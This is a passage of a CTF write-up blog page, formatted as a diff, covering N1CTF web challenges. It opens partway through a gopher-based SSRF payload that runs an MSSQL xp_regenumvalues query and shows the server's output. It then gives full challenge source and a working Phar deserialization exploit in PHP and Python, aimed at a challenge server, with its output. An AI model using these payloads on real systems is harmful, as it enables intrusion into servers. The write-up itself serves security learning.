class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00E</span><span class="hljs-meta">%00X</span><span class="hljs-meta">%00E</span><span class="hljs-meta">%00C</span><span class="hljs-meta">%00U</span><span class="hljs-meta">%00T</span><span class="hljs-meta">%00E</span><span class="hljs-meta">%00</span><span class="hljs-meta">%20</span><span class="hljs-meta">%00m</span><span class="hljs-meta">%00a</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00t</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00r</span><span class="hljs-meta">%00</span>.<span class="hljs-meta">%00s</span><span class="hljs-meta">%00y</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00</span>.<span class="hljs-meta">%00x</span><span class="hljs-meta">%00p</span><span class="hljs-meta">%00_</span><span class="hljs-meta">%00r</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00</span><span class="hljs-meta">%67</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00n</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00m</span><span class="hljs-meta">%00v</span><span class="hljs-meta">%00a</span><span class="hljs-meta">%00</span><span class="hljs-meta">%6C</span><span class="hljs-meta">%00u</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00s</span><span class="hljs-meta">%00</span><span class="hljs-meta">%20</span><span class="hljs-meta">%00</span><span class="hljs-meta">%27</span><span class="hljs-meta">%00H</span><span class="hljs-meta">%00K</span><span class="hljs-meta">%00E</span><span class="hljs-meta">%00Y</span><span class="hljs-meta">%00_</span><span class="hljs-meta">%00</span><span class="hljs-meta">%4C</span><span class="hljs-meta">%00O</span><span class="hljs-meta">%00C</span><span class="hljs-meta">%00A</span><span class="hljs-meta">%00</span><span class="hljs-meta">%4C</span><span class="hljs-meta">%00_</span><span class="hljs-meta">%00M</span><span class="hljs-meta">%00A</span><span class="hljs-meta">%00C</span><span class="hljs-meta">%00H</span><span class="hljs-meta">%00I</span><span class="hljs-meta">%00N</span><span class="hljs-meta">%00E</span><span class="hljs-meta">%00</span><span class="hljs-meta">%27</span><span class="hljs-meta">%00</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%00</span><span class="hljs-meta">%27</span><span class="hljs-meta">%00S</span><span class="hljs-meta">%00o</span><span class="hljs-meta">%00f</span><span class="hljs-meta">%00t</span><span class="hljs-meta">%00w</span><span class="hljs-meta">%00a</span><span class="hljs-meta">%00r</span><span class="hljs-meta">%00e</span><span class="hljs-meta">%00</span><span class="hljs-meta">%5C</span><span class="hljs-meta">%00N</span><span class="hljs-meta">%001</span><span class="hljs-meta">%00C</span><span class="hljs-meta">%00T</span><span class="hljs-meta">%00F</span><span class="hljs-meta">%002</span><span class="hljs-meta">%000</span><span class="hljs-meta">%002</span><span class="hljs-meta">%001</span><span class="hljs-meta">%00</span><span class="hljs-meta">%27</span><span class="hljs-meta">%00</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%00-</span><span class="hljs-meta">%00-</span><span class="hljs-meta">%00</span><span class="hljs-meta">%20</span><span class="hljs-meta">%00-</span><span class="hljs-meta">%00</span>
++ !<span class="hljs-string">&quot;&quot;</span>���&lt;�astermaster�lE<span class="hljs-meta">%Changed</span> database <span class="hljs-keyword">context</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;master&#x27;</span>.
+<span class="hljs-number">10_11_22_9</span>�     �<span class="hljs-number">4</span>� 
+us_english�pG<span class="hljs-string">&#x27;Changed language setting to us_english.
+10_11_22_9�6tMicrosoft SQL Server��40964096��&lt;���    �4Value��    �4Data�&quot;flll111aaaAAAgGGGFn1ctf{CuURLLL_i111ssS_soOO0_FuUUnN}��y��--_curl_--gopher://10.11.22.9:1433/Ad93152cc-1a4d-877b-e0ba-d1748ca3ae4e
+...</span></code></pre><p>We succeeded to get the first blood on this challenge. Nice!</p>
+<img src=//harold.kim/static/blog/n1ctf-web-7.jpg>
+
+
+<h3 id="easyphp"><a class="header-link" href="#easyphp"></a>Easyphp</h3>
+<blockquote>
+<p><a href="http://43.155.59.185:53340/">http://43.155.59.185:53340/</a></p>
+</blockquote>
+<p>This challenge was about loading an arbitrary object with the Phar metadata to load <code>Flag()</code> class and retrieve the flag.  This can be triggered from <code>file_exists()</code> function.</p>
+<p>More info avaiable on <a href="https://wiki.php.net/rfc/phar_stop_autoloading_metadata">https://wiki.php.net/rfc/phar_stop_autoloading_metadata</a> and probably also on some CTF challenges.</p>
+<p>Challenge sourcecode as follows:</p>
+<pre class="hljs"><code>
+--- index.php
+
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//include_once &quot;flag.php&quot;;</span>
+<span class="hljs-class"><span class="hljs-keyword">CLASS</span> <span class="hljs-title">FLAG</span> </span>{
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_flag</span> = <span class="hljs-string">&#x27;n1ctf{************************}&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;FLAG: &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;_flag;
+    } 
+}
+
+<span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;log.php&quot;</span>;
+
+<span class="hljs-keyword">if</span>(file_exists(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>])){
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file exist!&quot;</span>;
+}<span class="hljs-keyword">else</span>{
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file not exist!&quot;</span>;
+}
+
+<span class="hljs-meta">?&gt;</span>
+
+--- log.php
+
+<span class="hljs-meta">&lt;?php</span>
+define(<span class="hljs-string">&#x27;ROOT_PATH&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>));
+
+<span class="hljs-variable">$log_type</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;log_type&#x27;</span>];
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$log_type</span>)){
+    <span class="hljs-variable">$log_type</span> = <span class="hljs-string">&quot;look&quot;</span>;
+}
+
+<span class="hljs-variable">$gets</span> = http_build_query(<span class="hljs-variable">$_REQUEST</span>);
+
+<span class="hljs-variable">$real_ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];
+<span class="hljs-variable">$log_ip_dir</span> = ROOT_PATH . <span class="hljs-string">&#x27;/log/&#x27;</span> . <span class="hljs-variable">$real_ip</span>;
+
+<span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-variable">$log_ip_dir</span>)){
+    mkdir(<span class="hljs-variable">$log_ip_dir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
+}
+
+<span class="hljs-variable">$log</span> = <span class="hljs-string">&#x27;Time: &#x27;</span> . date(<span class="hljs-string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="hljs-string">&#x27; IP: [&#x27;</span> . @<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] . <span class="hljs-string">&#x27;], REQUEST: [&#x27;</span> . <span class="hljs-variable">$gets</span> . <span class="hljs-string">&#x27;], CONTENT: [&#x27;</span> . file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>) . <span class="hljs-string">&quot;]\n&quot;</span>;
+<span class="hljs-variable">$log_file</span> = <span class="hljs-variable">$log_ip_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$log_type</span> . <span class="hljs-string">&#x27;_www.log&#x27;</span>;
+
+file_put_contents(<span class="hljs-variable">$log_file</span>, <span class="hljs-variable">$log</span>, FILE_APPEND);
+
+<span class="hljs-meta">?&gt;</span></code></pre><p>All we need is to write on the <code>log.php</code> with Phar data on the right time and load the content in the server.</p>
+<p>First, we make a script that creates PharData with <code>Flag</code> class as a metadata.</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-class"><span class="hljs-keyword">CLASS</span> <span class="hljs-title">FLAG</span> </span>{
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;FLAG: &quot;</span> . <span class="hljs-keyword">$this</span>-&gt;_flag;
+    }
+}
+
+@unlink(<span class="hljs-string">&quot;get_flag.tar&quot;</span>);
+<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> PharData(<span class="hljs-string">&quot;get_flag.tar&quot;</span>);
+<span class="hljs-variable">$phar</span>[<span class="hljs-string">&quot;ABCDstypr&quot;</span>] = <span class="hljs-string">&quot;GETFLAGGETFLAG&quot;</span>;
+<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> FLAG();
+<span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$obj</span>);
+
+<span class="hljs-keyword">echo</span> date(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>, time());</code></pre><p>Then the next step is to modify the checksum and make it look like a valid Phar file.</p>
+<p>There is an amazing blog post about this attack so worth checking this blog post for more detailed information.</p>
+<ul class="list">
+<li><a href="https://blog.shpik.kr/php,/unserialize,/rce/2019/02/18/PHP_Exploitation_using_FILE_Function.html">https://blog.shpik.kr/php,/unserialize,/rce/2019/02/18/PHP_Exploitation_using_FILE_Function.html</a></li>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> python2</span>
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> struct
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_checksum</span>(<span class="hljs-params">data</span>):</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(struct.unpack_from(<span class="hljs-string">&quot;148B8x356B&quot;</span>,data))+<span class="hljs-number">256</span>
+
+<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:
+    <span class="hljs-comment"># generate date and phar content</span>
+    generated_date = os.popen(<span class="hljs-string">&quot;php exp_gen.php&quot;</span>).read().split(<span class="hljs-string">&quot;FLAG: &quot;</span>)[<span class="hljs-number">0</span>]
+    generated_type = <span class="hljs-string">&quot;styp979&quot;</span>
+    generated_metadata = <span class="hljs-string">&quot;Time: &quot;</span> + generated_date + <span class="hljs-string">&quot; IP: [], REQUEST: [log_type=&quot;</span> + generated_type + <span class="hljs-string">&quot;], CONTENT: [&quot;</span>
+
+    <span class="hljs-comment"># make it into phar format</span>
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;get_flag.tar&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
+        data = f.read()
+    new_name = generated_metadata.ljust(<span class="hljs-number">100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>).encode()
+    new_data = new_name + data[<span class="hljs-number">100</span>:]
+    checksum = calc_checksum(new_data)
+    new_checksum = <span class="hljs-built_in">oct</span>(checksum).rjust(<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;0&#x27;</span>).encode()+<span class="hljs-string">b&#x27;\x00&#x27;</span>
+    new_data = new_name + data[<span class="hljs-number">100</span>:<span class="hljs-number">148</span>] + new_checksum + data[<span class="hljs-number">156</span>:]
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;get_flag.log&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
+        f.write(new_data)
+        f.write(<span class="hljs-string">b&quot;]\n&quot;</span>)
+
+    <span class="hljs-comment"># request to server..</span>
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sending exp to the server...&quot;</span>)
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;get_flag.log&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
+        requests.post(<span class="hljs-string">&quot;http://43.155.59.185:53340/log.php?log_type=&quot;</span> + generated_type, data=f.read().replace(generated_metadata, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)).text
+
+    <span class="hljs-comment"># getflag</span>
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Getflag!&quot;</span>)
+    <span class="hljs-built_in">print</span>(requests.get(<span class="hljs-string">&quot;http://43.155.59.185:53340/index.php?file=phar://log/158.101.144.10/&quot;</span> +generated_type + <span class="hljs-string">&quot;_www.log&quot;</span>).text)</code></pre><p>Running the exploit will print the flag.</p>
+<pre class="hljs"><code>root@stypr-jpn:~/aaa/phar# python exp_make.py
+Sending exp to the server...
+Getflag!
+download code:/download_env.zipfile exist!FLAG: n1ctf{f6ebe132457a2890285ccab4f8c834bd}</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
